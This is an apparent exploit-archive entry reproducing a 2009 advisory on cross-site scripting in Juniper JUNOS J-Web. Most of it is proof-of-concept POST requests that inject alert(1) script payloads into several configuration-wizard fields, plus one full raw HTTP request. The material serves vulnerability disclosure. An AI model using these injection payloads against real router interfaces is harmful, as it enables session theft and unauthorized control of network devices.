@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/36537/info
+  
+Juniper Networks JUNOS is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data to J-Web (Juniper Web Management).
+  
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+  
+This issue affects the following:
+  
+J-Web 8.5R1.14
+J-Web 9.0R1.1 
+
+Program URI :- http://www.example.com/configuration?m[]=wizards&m[]=rpm
+
+POST
+current-page=main&wizard-next=&wizard-mode=&wizard-args=&wizard-ids=&wizard-previous=&probe-owner-list-hidden=false&probe-owner-delete-hidden=true&probe-limit-hidden=false&probe-limit=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&probe-server-tcp-hidden=false&probe-server-tcp=&probe-server-udp-hidden=false&probe-server-udp=&ok-button=++OK++
+
+Program URI :- http://www.example.com/configuration?m[]=wizards&m[]=firewall-acl&m[]=firewall-filters
+
+POST
+current-page=firewall-filters&wizard-next=firewall-filter-term&wizard-mode=new-item&wizard-args=&wizard-ids=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&wizard-previous=firewall-filters&filteraclsummary-hidden=false&wizard-tab-page=firewall-filter-term&wizard-tab-selected=source&pager-new-identifier=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pager-new-location=end&term-name-search=&num-per-page=25&num-per-page=25&num-per-page=25
+
+Pogram URI :- http://www.example.com/configuration?m[]=wizards&m[]=cos&m[]=cos-interfaces
+
+POST
+current-page=cos-physical-interfaces-edit&wizard-next=cos-logical-interfaces-edit&wizard-mode=add&wizard-args=%7Bcos-physical-interface-name%7D&wizard-ids=%7Bcos-physical-interface-name%7D&wizard-previous=cos-physical-interfaces-edit&cos-physical-interface-name-hidden=false&cos-physical-interface-name=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&cos-physical-interface-scheduler-map-hidden=false&cos-physical-interface-scheduler-map=&cos-logical-interfaces-list-hidden=false&cos-logical-interfaces-delete-hidden=true&cos-physical-interface-scheduler-map=
+
+PROGRAM URI :- http://www.example.com/configuration?m[]=wizards&m[]=snmp
+
+POST
+current-page=main&wizard-next=snmp-community&wizard-mode=edit&wizard-args=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&wizard-ids=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&wizard-previous=main&contact-hidden=false&contact=&description-hidden=false&description=&engineid-hidden=false&engineid=&location-hidden=false&location=&override-hidden=false&override=&communities-hidden=false&snmp-community-delete-hidden=true&trapgroups-hidden=false&snmp-trap-group-delete-hidden=true&health-monitor-enable-original=off&health-monitor-enable-hidden=false&interval-hidden=false&rising-threshold-non-jseries-hidden=false&falling-threshold-non-jseries-hidden=false&community-checked%5B%5D=off&health-monitor-enable=off&interval=&rising-threshold-non-jseries=&falling-threshold-non-jseries=
+
+PROGRAM URI :- http://www.example.com/configuration?m[]=wizards&m[]=users
+
+POST
+current-page=users&wizard-next=&wizard-mode=&wizard-args=&wizard-ids=&wizard-previous=&username-hidden=false&username=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&fullname-hidden=false&fullname=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&class-hidden=false&class=unauthorized&loginpassword-hidden=false&loginpassword=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&loginpassword-verify=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ok-button=++OK++&class=unauthorized
+
+PROGRAM URI :- http://www.example.com/configuration?m[]=wizards&m[]=https
+
+POST
+current-page=local-cert&wizard-next=&wizard-mode=&wizard-args=&wizard-ids=&wizard-previous=&certname-hidden=false&certname=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&certbody-hidden=false&certbody=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ok-button=++OK++
+
+
+POST /configuration?m[]=wizards&m[]=https HTTP/1.1
+Host: www.example.com
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
+Connection: close
+Referer: http://www.example.com/configuration?m[]=wizards&m[]=https&start=true
+Cookie: PHPSESSID=faf6133c44481c24b61a04f4c0ef57be;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 782
+https-allifls-hidden=false&https-interfaces-hidden=false&https-cert-hidden=false&local-cert-delete-hidden=true&wizard-next=b7777"><script>alert(1)</script>095b2419adf&https-allifls=on&https-allifls-original=on&xnmssltoggle=on&http-allifls-hidden=false&http-interfaces-hidden=false&certs-hidden=false&right-http-interfaces-duallist%5b%5d=lo0.16384&http-allifls=on&http-allifls-original=off&wizard-ids=&current-page=main&http-enable-hidden=false&text-hidden=false&wizard-args=&wizard-previous=&xnmssltoggle-hidden=false&httpstoggle-hidden=false&right-https-interfaces-duallist%5b%5d=lo0.16384&left-http-interfaces-duallist%5b%5d=em0.0&http-enable-original=on&httpstoggle-original=off&apply-button=Apply&xnmssltoggle-original=off&xnmssl-cert-hidden=false&http-enable=on&httpstoggle=on&wizard-mode=&http-interfaces-original=Array
